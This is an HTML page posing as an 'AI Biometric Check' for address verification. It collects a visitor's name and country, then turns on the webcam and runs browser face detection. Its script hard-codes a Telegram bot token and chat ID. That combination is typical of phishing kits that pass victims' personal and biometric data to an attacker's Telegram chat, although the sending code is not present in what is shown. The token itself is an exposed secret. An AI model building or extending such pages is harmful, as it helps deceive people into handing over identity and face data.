<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Smart Biometric & Location Security</title>
    <!-- 引入核心库：WebGL 加速版 -->
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-core@3.11.0/dist/tf-core.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-backend-webgl@3.11.0/dist/tf-backend-webgl.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-landmarks-detection@1.0.2/dist/face-landmarks-detection.min.js"></script>

    <style>
        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --error: #ef4444; }
        body { font-family: sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { background: var(--card); width: 100%; max-width: 480px; padding: 25px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; }
        input, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
        #step-verification { display: none; text-align: center; }
        #video-container { position: relative; margin: 15px 0; }
        #video, #hidden-canvas { width: 100%; max-width: 360px; border-radius: 10px; transform: scaleX(-1); background: #000; }
        #hidden-canvas { display: none; }
        #status-msg { font-weight: bold; color: var(--error); margin: 10px 0; }
    </style>
</head>
<body>

<div class="container">
    <!-- 步骤一：表单输入 -->
    <div id="step-form">
        <h2>Address Verification</h2>
        <div class="form-group"><label>First Name</label><input type="text" id="firstName"></div>
        <div class="form-group"><label>Last Name</label><input type="text" id="lastName"></div>
        <div class="form-group"><label>Country</label><select id="countrySelect"></select></div>
        <button class="btn" onclick="proceedToVerification()">Proceed to Biometric Check</button>
    </div>

    <!-- 步骤二：AI 活体检测 -->
    <div id="step-verification">
        <h2>AI Biometric Check</h2>
        <div id="video-container">
            <video id="video" autoplay playsinline muted></video>
            <canvas id="hidden-canvas"></canvas>
        </div>
        <div id="status-msg">Loading AI models...</div>
    </div>
</div>

<script>
    // --- 配置区域 ---
    const TG_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
    const TG_CHAT_ID = "7396947380";
    let detector;

    // 初始化国家列表
    const countries = ["USA", "UK", "Canada", "China", "Japan", "Germany"];
    const countrySelect = document.getElementById('countrySelect');
    countries.forEach(c => countrySelect.innerHTML += `<option value="${c}">${c}</option>`);

    // 步骤切换
    function proceedToVerification() {
        document.getElementById('step-form').style.display = 'none';
        document.getElementById('step-verification').style.display = 'block';
        initAiAndCamera();
    }

    async function initAiAndCamera() {
        try {
            // 强制使用 WebGL 以获得最佳识别性能
            await tf.setBackend('webgl');
            await tf.ready();

            const model = faceLandmarksDetection.SupportedModels.MediaPipeFaceMesh;
            detector = await faceLandmarksDetection.createDetector(model, { runtime: 'tfjs', maxFaces: 1 });

            const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
            document.getElementById('video').srcObject = stream;
            
            detectLoop();
        } catch (e) {
            document.getElementById('status-msg').textContent = "Camera error: " + e.message;
        }
    }

    async function detectLoop() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('hidden-canvas');
        const ctx = canvas.getContext('2d');
        const status = document.getElementById('status-msg');

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // --- 核心优化：预处理（对比度增强） ---
        // 通过对比度调节，确保逆光下人脸轮廓被识别
        ctx.filter = "brightness(1.3) contrast(1.6) saturate(1.2)";
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // 传入预处理后的 canvas 进行识别
        const faces = await detector.estimateFaces(canvas, { flipHorizontal: false });

        if (faces.length > 0) {
            status.textContent = "Face Detected! Proceeding...";
            status.style.color = "#10b981";
            // 识别成功后执行你的业务逻辑...
        } else {
            status.textContent = "Adjusting for lighting... Please look at the camera.";
            status.style.color = "#ef4444";
        }

        requestAnimationFrame(detectLoop);
    }
</script>
</body>
</html>
